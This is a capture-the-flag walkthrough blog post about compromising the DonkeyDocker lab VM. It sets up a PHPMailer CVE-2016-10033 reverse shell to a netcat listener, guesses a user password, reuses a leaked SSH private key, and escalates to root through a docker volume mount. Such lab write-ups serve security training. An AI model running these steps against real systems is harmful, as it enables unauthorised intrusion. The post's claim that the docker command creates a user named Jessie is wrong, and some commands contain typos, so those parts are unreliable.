@@ -1,0 +1,525 @@
+
+								
+																		Hack the DonkeyDocker (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on August 11, 2017
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Today we are going to solve a fun Vulnerable Lab DonkeyDocker, download this VM Machine from here.
+The credit for developing this VM machine is goes to Dennis Herrmann who hid 3 flags inside this lab as a challenge for hackers.
+Let’s Breach!!!
+Let us start form getting to know the IP of VM (Here, I have it at 192.168.1.120 but you will have to find your own)
+
+		
+		
+			
+			
+			
+			
+netdiscover
+			
+				
+					
+				
+					1
+				
+						netdiscover
+					
+				
+			
+		
+
+
+Use nmap command for port enumeration
+
+		
+		
+			
+			
+			
+			
+nmap -sV 192.168.1.120
+			
+				
+					
+				
+					1
+				
+						nmap -sV 192.168.1.120
+					
+				
+			
+		
+
+As you can see port 22 for ssh and 80 for HTTP are open, so let’s explore port 80 through Browser
+
+After browsing I found three tabs Home, About and Contact but didn’t found any clue for the next step, then I decided to scan the target directory using dirb scan.
+
+Now open the terminal in Kali Linux and type the following command:
+
+		
+		
+			
+			
+			
+			
+dirb http://192.168.1.120
+			
+				
+					
+				
+					1
+				
+						dirb http://192.168.1.120
+					
+				
+			
+		
+
+From scanning result, I choose the highlighted directory http://192.168.1.120/mailer/examples/ for further enumeration.
+
+Here, we get to know that PHPMailer is running on a targeted system. Let try to find out its version.
+
+So After browsing a bit about PHP Mailer, we came to know that how to get the version of phpmailer
+
+		
+		
+			
+			
+			
+			
+http://192.168.1.120/mailer/VERSION
+			
+				
+					
+				
+					1
+				
+						http://192.168.1.120/mailer/VERSION
+					
+				
+			
+		
+
+We got the version of PHPMailer i.e. 5.2.16.
+
+From Google, we came to known that PHPMailer 5.2.16 is vulnerable to Remote Code Execution (python) {CVE-2016-10033}. Exploiting PHPMail with the back connection (reverse shell) from the target. You can download this exploit from here.
+
+After Downloading the Python File and make the following changes:
+
+Open the file and add “# coding: utf-8” at the beginning.
+Set target = ‘http://192.168.1.120/contact’ (victim IP), it is the location where backdoor.php get uploaded in the victim’s machine automatically.
+Give attacker IP: 192.168.1.101(Kali Linux IP) inside payload code 
+After making the above changes save it.
+
+
+Now start netcat at the same port on which the payload is binding i.e. 4444 for establishing a reverse connection with the target.
+
+		
+		
+			
+			
+			
+			
+nc -lvp 4444
+			
+				
+					
+				
+					1
+				
+						nc -lvp 4444
+					
+				
+			
+		
+
+
+Before you run the python script, type following command in a new terminal which will install the exploit dependency.
+
+		
+		
+			
+			
+			
+			
+pip2 install requests_toolbelt
+			
+				
+					
+				
+					1
+				
+						pip2 install requests_toolbelt
+					
+				
+			
+		
+
+Now run the script in order to exploit the target as shown in the given image.
+
+		
+		
+			
+			
+			
+			
+python 40974.py
+			
+				
+					
+				
+					1
+				
+						python 40974.py
+					
+				
+			
+		
+
+
+Move back netcat shell and here you will find that it is connected to the victim but not able to access proper shell of the victim system, therefore, type the given command in order to access victim shell properly as shown in the image.
+
+		
+		
+			
+			
+			
+			
+python -c 'import pty;pty.spawn("/bin/bash")'
+			
+				
+					
+				
+					1
+				
+						python -c 'import pty;pty.spawn("/bin/bash")'
+					
+				
+			
+		
+
+
+Once you got the victim shell type following commands for finding the hidden flag.
+
+		
+		
+			
+			
+			
+			
+ls
+cat main.sh
+			
+				
+					
+				
+					12
+				
+						lscat main.sh
+					
+				
+			
+		
+
+Here we found user smith which is a directory has flag.txt let approach toward this directory.
+
+		
+		
+			
+			
+			
+			
+cd home
+ls
+			
+				
+					
+				
+					12
+				
+						cd homels
+					
+				
+			
+		
+
+While again opening the smith directory, we got “Permission denied”.
+Then we used su smith to instead of sudo because sudo is not accessible in this shell
+
+		
+		
+			
+			
+			
+			
+su smith
+			
+				
+					
+				
+					1
+				
+						su smith
+					
+				
+			
+		
+
+For Password, we tried “smith” and successfully get smith’s shell
+
+Now we are inside smith shell, type following command to get the flag
+
+		
+		
+			
+			
+			
+			
+ls
+cd /home/smith
+ls
+flag.txt
+cat flag.xt
+			
+				
+					
+				
+					12345
+				
+						lscd /home/smithlsflag.txtcat flag.xt
+					
+				
+			
+		
+
+Great!! Successfully capture the 1st flag
+Moreover, if you notice the given image. You will find next clue “I like 1984 written by Geoge ORWELL” it could be possible that this might be the user name having a 2nd flag inside it.
+
+Type following command to view all directory list
+
+		
+		
+			
+			
+			
+			
+ls -al
+			
+				
+					
+				
+					1
+				
+						ls -al
+					
+				
+			
+		
+
+We got the authorized keys, id_ed25519 and id_ed25519.pub in SSH directory, let’s open these key one by one
+
+		
+		
+			
+			
+			
+			
+cat authorized_keys
+cat id_ed25519
+cat id_ed25519.pub
+			
+				
+					
+				
+					123
+				
+						cat authorized_keyscat id_ed25519cat id_ed25519.pub
+					
+				
+			
+		
+
+In id_ed25519 we get the OpenSSH Private Key and this key is authorized for [email protected]. Now copy the private key and past inside the text file.
+
+Save this Private Key in a file as id_rsa as shown in the given below image.
+
+Now using ssh login by
+
+		
+		
+			
+			
+			
+			
+ssh -i id_rsa orwell@192.168.1.120
+			
+				
+					
+				
+					1
+				
+						ssh -i id_rsa orwell@192.168.1.120
+					
+				
+			
+		
+
+Here you will be greeted by the Donkey Docker Shell. Now check directory list for the 2nd flag
+
+		
+		
+			
+			
+			
+			
+ls
+flag.txt
+cat flag.xt
+			
+				
+					
+				
+					123
+				
+						lsflag.txtcat flag.xt
+					
+				
+			
+		
+
+ Nice!! Successfully got the 2nd shell
+
+Now for the last flag, we tried a lot of different tricks but nothing seems to be getting through so we tried a method about which you can learn from here.
+
+Type following command
+
+		
+		
+			
+			
+			
+			
+docker run –v /root:/hack -t debian:jessie /bin/sh -c 'ls -al /hack'
+			
+				
+					
+				
+					1
+				
+						docker run –v /root:/hack -t debian:jessie /bin/sh -c 'ls -al /hack'
+					
+				
+			
+		
+
+This created a user named Jessie and gave it root access through privilege escalation; check all directory lists inside it, here we get the flag.txt file.
+
+Now to open this file we will use the previous command just with slight modification as shown:
+
+		
+		
+			
+			
+			
+			
+docker run -v /root:/hack -t debian:jessie /bin/sh -c 'cat /hack/flag.txt'
+			
+				
+					
+				
+					1
+				
+						docker run -v /root:/hack -t debian:jessie /bin/sh -c 'cat /hack/flag.txt'
+					
+				
+			
+		
+
+Awesome we got 3rd flag also.
+
+Author: Pavandeep Singh is An Ethical Hacker, Cyber Security Expert, Penetration Tester, India. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
